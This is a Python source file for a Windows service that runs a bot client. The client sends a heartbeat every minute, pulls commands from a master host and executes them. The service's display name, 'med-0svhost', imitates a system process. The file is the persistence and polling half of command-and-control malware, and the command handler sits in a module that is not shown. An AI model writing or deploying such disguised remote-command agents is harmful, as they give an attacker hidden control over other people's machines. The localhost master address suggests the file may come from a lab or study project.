import servicemanager
import win32event
import win32service
import socket
import win32serviceutil
from .bot import Bot

class MedusoService(win32serviceutil.ServiceFramework):
    _svc_name_ = "medus0"
    _svc_display_name_ = "med-0svhost"
    _master_host = "http://localhost:5000"

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        self.bot = Bot(self._master_host)

    def SvcStop(self):
        with open('C:\\meduso.log', 'a') as f:
            f.write('meduso stopping...\n')
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)

    def SvcDoRun(self):
        rc = None
        
        self.bot.startUp()
        while rc != win32event.WAIT_OBJECT_0:
            self.bot.heartBeat()

            cmds = self.bot.lookForCommands()
            for c in cmds:
                r = self.bot.doCommand(c['id'], c['type'], c['parameter'])

            rc = win32event.WaitForSingleObject(self.hWaitStop,  (1 * 60 * 1000))